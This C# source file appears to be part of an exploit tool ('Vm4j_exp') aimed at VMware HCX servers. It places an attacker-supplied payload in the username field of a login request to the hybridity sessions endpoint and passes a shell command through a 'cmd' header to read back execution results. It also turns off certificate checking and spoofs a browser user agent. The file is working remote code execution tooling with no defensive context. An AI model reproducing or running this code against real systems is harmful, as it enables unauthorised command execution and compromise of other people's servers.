using System;
using System.IO;
using System.Net;
using System.Text;


namespace Vm4j_exp.ExecPayload
{
    class VHCX
    {
        private static string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";
        private static int Timeout = 10000;
        public static string VHCXEcho(string url, string cmd, string payload)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = false;
            Log log = new Log();
            string postdata = "{\"authType\": \"password\",\"username\": \"" + payload + "\",\"password\": \"vm4j\"}";
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url.EndsWith("/") ? url + "hybridity/api/sessions" : url + "/hybridity/api/sessions");
#if DEBUG
                System.Net.WebProxy proxy = new WebProxy("127.0.0.1", 8080);
                request.Proxy = proxy;
#else 
            request.Proxy = null;
#endif
                request.Method = "POST";
                request.ContentType = "application/json; charset=UTF-8";
                request.UserAgent = UserAgent;
                request.KeepAlive = false;
                request.Accept = "*/*";
                request.Timeout = Timeout;
                request.Headers.Add("cmd", cmd);
                byte[] data = Encoding.UTF8.GetBytes(postdata);
                request.ContentLength = data.Length;
                using (Stream reqStream = request.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                StringBuilder sb = new StringBuilder();
                using (HttpWebResponse resp = (HttpWebResponse)request.GetResponse())
                {
                    using (StreamReader reader = new StreamReader(resp.GetResponseStream(), Encoding.UTF8))
                    {
                        try
                        {
                            while (!reader.EndOfStream)
                            {
                                sb.Append((char)reader.Read());
                            }
                        }
                        catch (IOException e)
                        {
                            log.LogError("Get Error:" + e.Message);
                        }
                    }
                }
                string result = sb.ToString();
                return result;
            }
            catch (Exception e)
            {
                log.LogError("Get Error:" + e.Message);
                return "false";
            }
        }
        public static string VHCXExec(string url, string payload)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = false;
            Log log = new Log();
            string postdata = "{\"authType\": \"password\",\"username\": \"" + payload + "\",\"password\": \"vm4j\"}";
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url.EndsWith("/") ? url + "hybridity/api/sessions" : url + "/hybridity/api/sessions");
#if DEBUG
                System.Net.WebProxy proxy = new WebProxy("127.0.0.1", 8080);
                request.Proxy = proxy;
#else 
                request.Proxy = null;
#endif
                request.Method = "POST";
                request.ContentType = "application/json; charset=UTF-8";
                request.UserAgent = UserAgent;
                request.KeepAlive = false;
                request.Accept = "*/*";
                request.Timeout = Timeout;
                byte[] data = Encoding.UTF8.GetBytes(postdata);
                request.ContentLength = data.Length;
                using (Stream reqStream = request.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                StringBuilder sb = new StringBuilder();
                using (HttpWebResponse resp = (HttpWebResponse)request.GetResponse())
                {
                    return "true";
                }

            }
            catch (Exception e)
            {
                log.LogError("Get Error:" + e.Message);
                return "false";
            }
        }
    }
}
